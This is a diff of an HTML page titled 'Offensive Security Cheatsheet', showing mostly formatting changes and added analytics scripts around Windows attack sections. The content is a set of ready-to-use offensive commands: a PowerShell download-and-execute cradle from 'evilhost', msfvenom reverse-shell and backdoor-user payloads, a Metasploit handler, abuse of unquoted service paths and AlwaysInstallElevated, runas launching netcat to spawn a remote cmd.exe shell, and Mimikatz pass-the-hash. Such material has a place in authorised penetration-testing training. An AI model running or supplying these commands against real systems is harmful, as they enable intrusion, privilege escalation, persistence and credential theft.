@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:01 CET">
 <title>Tricks :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1833,9 +1862,7 @@
     
     
     
-    
-
-<h3 id="global-tricks">Global Tricks</h3>
+    <h3 id="global-tricks">Global Tricks</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
 https://guif.re/windowseop
 https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
@@ -1861,12 +1888,11 @@ hyperion.exe ../backdoor.exe ../backdoor_mutation.exe
 powershell.exe <span style="color:#d88200">&#34;IEX (New-Object  Net.WebClient).DownloadString(&#39;http://evilhost/Malicious.ps1&#39;)&#34;</span>
 
 <span style="color:#75715e"># Payload as a trusted binary</span>
-<span style="color:#75715e"># Copy your payload into</span> 
+<span style="color:#75715e"># Copy your payload into </span>
 %userprofile%<span style="color:#8045ff">\A</span>ppData<span style="color:#8045ff">\L</span>ocal<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\T</span>eams<span style="color:#8045ff">\c</span>urrent<span style="color:#8045ff">\
 </span><span style="color:#8045ff"></span><span style="color:#75715e"># Then</span>
-%userprofile%<span style="color:#8045ff">\A</span>ppData<span style="color:#8045ff">\L</span>ocal<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\T</span>eams<span style="color:#8045ff">\U</span>pdate.exe --processStart payload.exe --process-start-args <span style="color:#d88200">&#34;whatever args&#34;</span></code></pre></div>
-<p><br/></p>
-
+%userprofile%<span style="color:#8045ff">\A</span>ppData<span style="color:#8045ff">\L</span>ocal<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\T</span>eams<span style="color:#8045ff">\U</span>pdate.exe --processStart payload.exe --process-start-args <span style="color:#d88200">&#34;whatever args&#34;</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="process-migration">Process Migration</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Migration can be essential to get persistence</span>
 <span style="color:#75715e"># You might need to migrate into a classic process</span>
@@ -1882,18 +1908,16 @@ msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:
 msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> LHOST xx.xx.xx.xx
 msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> LPORT <span style="color:#ae81ff">5566</span>
 msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> AutoRunScript multi_console_command -r /path/to/automigrate.rc
-msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit</code></pre></div>
-<p><br/></p>
-
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="folder-and-files-rights">Folder and Files Rights</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># icacls allows you to check for files and folder permissions</span>
 C:&gt; icacls Desktop/
 C:&gt; icacls root.txt
 
 <span style="color:#75715e"># If you have rights on the folder but not especially on files, you can grant them</span>
-C:&gt; icacls root.txt /grant user:F</code></pre></div>
-<p><br/></p>
-
+C:&gt; icacls root.txt /grant user:F
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="unquoted-paths">Unquoted Paths</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Some paths are vulnerable</span>
 <span style="color:#75715e"># It occurs because Windows will try for every whitespace, to find the binary in every intermediate folder</span>
@@ -1907,7 +1931,7 @@ C:<span style="color:#8045ff">\P</span>rogram Files.exe
 wmic service get name,displayname,pathname,startmode <span style="color:#111">|</span>findstr /i <span style="color:#d88200">&#34;Auto&#34;</span> <span style="color:#111">|</span>findstr /i /v <span style="color:#d88200">&#34;C:\Windows\\&#34;</span> <span style="color:#111">|</span>findstr /i /v <span style="color:#d88200">&#34;&#34;&#34; rmthelastquote&#34;</span>
 
 <span style="color:#75715e"># Reverse shell</span>
-msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o A.exe
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span>192.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o A.exe
 msf&gt; upload -f A.exe
 sc stop <span style="color:#d88200">&#34;Vulnerable Service&#34;</span>
 
@@ -1919,17 +1943,15 @@ shutdown /r /t <span style="color:#ae81ff">0</span>
 <span style="color:#75715e"># If it’s not, Service Control Manager thinks that something is not going well and terminates the process</span>
 
 <span style="color:#75715e"># MSF Module for this vulnerability</span>
-exploit/windows/local/trusted_service_path</code></pre></div>
-<p><br/></p>
-
+exploit/windows/local/trusted_service_path
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="run-as">Run As</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If application is running as admin and credentials saved in there you can abuse it by modifying its properties that way:</span>
 C:<span style="color:#8045ff">\W</span>INDOWS<span style="color:#8045ff">\s</span>ystem32<span style="color:#8045ff">\r</span>unas.exe /user:administrator /savecreds <span style="color:#d88200">&#34;C:\Documents and Settings\username\Desktop\nc.exe -nc 10.11.0.179 41337 -e C:\Windows\System32\cmd.exe&#34;</span>
 
 <span style="color:#75715e"># If you want to run a simple runas.exe:</span>
-C:<span style="color:#8045ff">\W</span>INDOWS<span style="color:#8045ff">\s</span>ystem32<span style="color:#8045ff">\r</span>unas.exe /user:administrator /password:pass <span style="color:#d88200">&#34;C:\Documents and Settings\username\Desktop\nc.exe -nc 10.11.0.179 41337 -e C:\Windows\System32\cmd.exe&#34;</span></code></pre></div>
-<p><br/></p>
-
+C:<span style="color:#8045ff">\W</span>INDOWS<span style="color:#8045ff">\s</span>ystem32<span style="color:#8045ff">\r</span>unas.exe /user:administrator /password:pass <span style="color:#d88200">&#34;C:\Documents and Settings\username\Desktop\nc.exe -nc 10.11.0.179 41337 -e C:\Windows\System32\cmd.exe&#34;</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="alwaysinstallelevated">AlwaysInstallElevated</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># It&#39;s a setting allowing unprivileged users to run Windows Installer Packages Files (MSI) with elevated permissions (SYSTEM)</span>
 
@@ -1942,7 +1964,7 @@ reg query HKCU<span style="color:#8045ff">\S</span>OFTWARE<span style="color:#80
 msfvenom -p windows/adduser <span style="color:#111">USER</span><span style="color:#f92672">=</span>backdoor <span style="color:#111">PASS</span><span style="color:#f92672">=</span>backdoor123 -f msi -o evil.msi
 
 <span style="color:#75715e"># Or reverse shell</span>
-msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o Payload.exe
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span>192.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o Payload.exe
 msfvenom -f msi-nouac -p windows/exec <span style="color:#111">cmd</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;C:\Users\testuser\AppData\Local\Temp\Payload.exe&#34;</span> &gt; malicious.msi
 
 
@@ -1951,9 +1973,8 @@ msfvenom -f msi-nouac -p windows/exec <span style="color:#111">cmd</span><span s
 msiexec /quiet /qn /i C:<span style="color:#8045ff">\e</span>vil.msi
 
 <span style="color:#75715e"># MSF module</span>
-exploit/windows/local/always_install_elevated</code></pre></div>
-<p><br/></p>
-
+exploit/windows/local/always_install_elevated
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="pass-the-hash-using-machine-accounts">Pass the Hash using Machine Accounts</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Need to be local admin on the target machine</span>
 
@@ -1969,8 +1990,8 @@ sekurlsa::logonPasswords
 dir <span style="color:#8045ff">\\</span>dc01<span style="color:#8045ff">\c</span>$
 
 <span style="color:#75715e"># You can use Mimikatz to PtH and elevate to domain admin because WS01$ is in Domain Admins</span>
-sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861</code></pre></div>
-<p><br/></p>
+sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861
+</code></pre></div><!-- raw HTML omitted -->
 
 
     
